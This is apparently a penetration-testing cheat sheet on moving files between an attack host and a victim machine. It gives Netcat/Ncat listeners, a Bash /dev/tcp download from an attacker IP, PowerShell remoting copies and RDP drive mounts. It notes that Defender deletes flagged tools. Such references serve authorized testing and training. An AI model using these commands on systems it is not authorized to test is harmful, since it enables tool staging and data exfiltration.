## Netcat Inbound Transfer

Firewall allows inbound connections to the target and a Netcat-variant is present on the victim.

Listen on victim using original Netcat to receive file

```
nc -l -p <PORT> > <FILE_PATH>
```

Listen on victim using Ncat to receive file and close on completion

```
ncat -l -p <PORT> --recv-only > <FILE_PATH>
```

Send file from attack host to listening victim using original Netcat

```
nc -q 0 <TARGET_IP> <PORT> < <FILE_PATH>
```

Send file from attack host to listening victim using Ncat

```
ncat --send-only <TARGET_IP> <PORT> < <FILE_PATH>
```

- **Tool comparison**
    
    - Original Netcat -> `nc -l -p <PORT>` -> Basic listener; lacks modern proxy/SSL support.
    - Ncat -> `ncat -l -p <PORT> --recv-only` -> Reimplementation; supports SSL, IPv6, SOCKS, and explicit connection termination.
- **Gotchas**
    
    - **Connection hangs** if `-q 0` (original nc) or `--send-only`/`--recv-only` (ncat) flags are omitted.

## Netcat Outbound Transfer

Inbound connections to the target are blocked by a firewall but egress to the attack host is permitted.

Listen on attack host to send file using original Netcat

```
sudo nc -l -p <PORT> -q 0 < <FILE_PATH>
```

Listen on attack host to send file using Ncat

```
sudo ncat -l -p <PORT> --send-only < <FILE_PATH>
```

Connect from victim to receive file using original Netcat

```
nc <ATTACK_IP> <PORT> > <FILE_PATH>
```

Connect from victim to receive file using Ncat

```
ncat <ATTACK_IP> <PORT> --recv-only > <FILE_PATH>
```

- **Dangerous / misconfigured settings**
    - Listening on low-numbered ports requires **root/sudo privileges** on the attack host.

## Bash /dev/tcp Transfer

Netcat/Ncat is missing from the victim but Bash is available for outbound connections to the attack host.

Receive file on victim via pseudo-device

```
cat < /dev/tcp/<ATTACK_IP>/<PORT> > <FILE_PATH>
```

- **Gotchas**
    - **Silent failure** occurs if the Bash version was not compiled with the net-redirections feature enabled.

> ⚠️ Gap: The source does not specify how to verify if `/dev/tcp` support is enabled in the current Bash build before attempting the transfer.

## PowerShell Remoting Transfer

HTTP/SMB transfer methods are blocked but WinRM is enabled and administrative credentials or proper group membership are available.

Verify WinRM connectivity to target

```
Test-NetConnection -ComputerName <TARGET_IP> -Port 5985
```

Establish session to target using existing privileges

```
$Session = New-PSSession -ComputerName <TARGET_IP>
```

Copy file from attack host to remote session

```
Copy-Item -Path <FILE_PATH> -ToSession $Session -Destination <FILE_PATH>
```

Copy file from remote session back to attack host

```
Copy-Item -Path <FILE_PATH> -Destination <FILE_PATH> -FromSession $Session
```

- **Dangerous / misconfigured settings**
    
    - Requires **Administrative access**, Remote Management Users group membership, or explicit session configuration permissions.
- **Gotchas**
    
    - **WinRM disabled** by default unless listeners are configured; typically uses 5985 (HTTP) or 5986 (HTTPS).

## RDP Resource Mounting

GUI access is available via RDP and large file transfers or directory access are required without using the clipboard.

Mount Linux directory using rdesktop

```
rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<FILE_PATH>'
```

Mount Linux directory using xfreerdp

```
xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<FILE_PATH>
```

Access mounted share within Windows session

```
cd \\tsclient\linux
```

- **Tool comparison**
    
    - xfreerdp/rdesktop -> `/drive` or `-r disk` -> Use when copy/paste fails or transferring multiple files.
    - mstsc.exe -> Local Resources tab -> Native Windows client for mounting local drives.
- **Gotchas**
    
    - **Malware deletion** by Windows Defender occurs automatically if it scans the mounted share containing flagged tools.
    - **Clipboard failure** is common with xfreerdp and rdesktop, necessitating the drive mounting method.